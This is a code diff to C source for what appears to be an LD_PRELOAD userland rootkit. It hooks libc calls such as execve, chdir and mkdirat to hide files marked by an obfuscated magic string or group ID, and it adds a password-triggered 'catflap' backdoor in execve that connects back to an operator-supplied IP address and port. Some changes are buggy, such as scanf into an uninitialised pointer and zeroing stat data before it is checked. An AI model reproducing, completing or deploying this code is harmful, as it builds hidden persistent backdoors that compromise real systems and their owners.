@@ -107,30 +107,39 @@ long int ptrace(enum __ptrace_request request, ...)
 int execve(const char *path, char *const argv[], char *const envp[])
 {
 	HOOK(execve);
+	HOOK(__xstat);
 	#ifdef DEBUG 
 	printf("[!] execve hooked"); 
 	#endif
-	
+
+	char *magic = strdup(MAGIC); xor(magic); 
+	struct stat filestat; 
+	old___xstat(_STAT_VER, path, &filestat); 
 	if (owned())
 	{
 		if (argv[1] != NULL)
-		{ 
+		{
 			char *execpw = strdup(EXECPW); xor(execpw); 
-			if (!strcmp(argv[1],  execpw))
-			{	
+			if (!strcmp(argv[1], execpw))
+			{
 				if (!strcmp(argv[2], "catflap"))
-				{ 
-					printf("opening catflap\n");
-				        catflap(IP, DEFAULT_PORT);
+				{
+					char *ip; 
+					int port;
+					scanf("callback ip address: %s", ip);
+					scanf("port: %d", &port);
+					printf("opening catflap...");
+					catflap(ip, port);	
 				}
-			} 
-//			CLEAN(execpw);
-			return old_execve(path, argv, envp);
+			}
+			CLEAN(execpw);	
 		}
-	       	return old_execve(path, argv, envp);	
-	} 
-	return old_execve(path, argv, envp); 
-} 
+		return old_execve(path, argv, envp);
+	}
+	return old_execve(path, argv, envp);
+}
+
+		       	
 
 int stat(const char *path, struct stat *buf)
 {
@@ -399,6 +408,7 @@ int chdir(const char *path)
 	char *magic = strdup(MAGIC); xor(magic);
        	struct stat filestat; 
 	old___xstat(_STAT_VER, path, &filestat);	
+	memset(&filestat, 0x00, sizeof(filestat));
 	if (owned()) return old_chdir(path);
 	if (strstr(path, magic) || (filestat.st_gid == MAGICGID))
 	{
@@ -436,10 +446,10 @@ int mkdirat(int dirfd, const char *pathname, mode_t mode)
 	printf("[!] mkdirat hooked"); 
 	#endif
 
-	if (owned()) return old_mkdirat(int dirfd, const char *pathname, mode_t mode);
+	if (owned()) return old_mkdirat(dirfd, pathname, mode);
 	char *magic = strdup(MAGIC); xor(magic); 
 	struct stat filestat; 
-	old___xstat(_STAT_VER, pathname, filestat); 
+	old___xstat(_STAT_VER, pathname, &filestat); 
 	if ((strstr(pathname, magic)) || (filestat.st_gid == MAGICGID))
 	{
 		CLEAN(magic);
